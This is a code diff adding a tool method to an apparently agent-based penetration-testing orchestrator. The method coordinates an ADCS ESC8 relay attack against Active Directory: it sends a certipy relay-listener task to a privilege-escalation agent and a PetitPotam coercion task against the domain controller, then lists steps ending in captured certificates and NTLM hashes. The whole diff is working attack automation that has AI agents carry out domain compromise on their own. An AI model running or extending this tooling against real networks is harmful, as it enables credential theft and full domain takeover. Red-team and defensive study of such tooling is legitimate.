@@ -670,6 +670,114 @@ class OrchestratorTools(Toolset):
         return f"✗ Coercion failed: {result.error}"
 
     @dn.tool_method
+    async def dispatch_esc8_attack(
+        self,
+        ca_host: str,
+        dc_ip: str,
+        domain: str,
+        username: str,
+        password: str,
+        attacker_ip: str,
+        ca_name: str = "",
+    ) -> str:
+        """
+        Dispatch ESC8 relay attack (ADCS Web Enrollment exploitation).
+
+        ESC8 requires coordination between PRIVESC (relay listener) and COERCION (petitpotam).
+        This tool dispatches both tasks in the correct sequence:
+        1. PRIVESC starts certipy relay to listen for relayed auth
+        2. COERCION runs petitpotam to coerce DC to authenticate to relay
+
+        Args:
+            ca_host: Certificate Authority host (where web enrollment is enabled)
+            dc_ip: Domain controller IP (target for petitpotam coercion)
+            domain: Target domain
+            username: Username with domain access
+            password: Password for authentication
+            attacker_ip: Attacker IP where relay listener will run
+            ca_name: Optional CA name (auto-detected if not provided)
+
+        Returns:
+            Status of both dispatched tasks
+
+        Example:
+            >>> dispatch_esc8_attack(
+            ...     ca_host="dc01.corp.local",
+            ...     dc_ip="192.168.56.10",
+            ...     domain="corp.local",
+            ...     username="user",
+            ...     password="pass",  # pragma: allowlist secret
+            ...     attacker_ip="192.168.56.100"
+            ... )
+        """
+        results = []
+
+        # Step 1: Dispatch ESC8 exploit to PRIVESC (starts relay listener)
+        exploit_params = {
+            "ca_host": ca_host,
+            "ca_name": ca_name or ca_host,
+            "dc_ip": dc_ip,
+            "domain": domain,
+            "username": username,
+            "password": password,
+            "attacker_ip": attacker_ip,
+            "coerce_target": dc_ip,  # Tell privesc where to expect coerced auth from
+        }
+
+        privesc_task_id = await self.dispatcher.request_exploit(
+            vuln_type="ADCS_ESC8",
+            vuln_id=f"ADCS_ESC8_{ca_host}",
+            target=ca_host,
+            source_agent=self._agent_name,
+            params=exploit_params,
+        )
+
+        if privesc_task_id:
+            results.append(f"✓ Relay listener task dispatched to PRIVESC: {privesc_task_id}")
+            logger.info(f"ESC8 relay task {privesc_task_id} dispatched to privesc")
+        else:
+            results.append("✗ Failed to dispatch relay listener - no privesc agent available")
+
+        # Step 2: Dispatch petitpotam to COERCION
+        # Use request_coercion with petitpotam-specific parameters
+        coercion_payload = {
+            "coercion_type": "petitpotam",
+            "target": dc_ip,
+            "listener": attacker_ip,
+            "username": username,
+            "password": password,
+            "domain": domain,
+            "note": f"ESC8 attack - coerce DC to authenticate to relay at {attacker_ip}",
+        }
+
+        coercion_task_id = await self.dispatcher.request_coercion(
+            source_agent=self._agent_name,
+            interface="",  # Not needed for petitpotam
+            techniques=["petitpotam"],  # Signal petitpotam-style coercion
+            duration=60,
+            payload_override=coercion_payload,
+        )
+
+        if coercion_task_id:
+            results.append(f"✓ PetitPotam coercion task dispatched to COERCION: {coercion_task_id}")
+            logger.info(f"ESC8 coercion task {coercion_task_id} dispatched to coercion")
+        else:
+            results.append("✗ Failed to dispatch coercion - no coercion agent available")
+
+        # Provide next steps
+        results.append("")
+        results.append("📋 ESC8 Attack Workflow:")
+        results.append("  1. PRIVESC will start certipy relay listener")
+        results.append("  2. COERCION will run petitpotam against DC")
+        results.append("  3. DC authenticates to relay, capturing certificate")
+        results.append("  4. PRIVESC uses certipy_auth with captured cert for NTLM hash")
+        results.append("")
+        results.append("→ Monitor with get_pending_tasks()")
+        results.append("→ Check results with get_all_hashes() after completion")
+
+        return "\n".join(results)
+
+    @dn.tool_method
     def get_pending_tasks(self) -> str:
         """
         Get status of all pending tasks across agents.
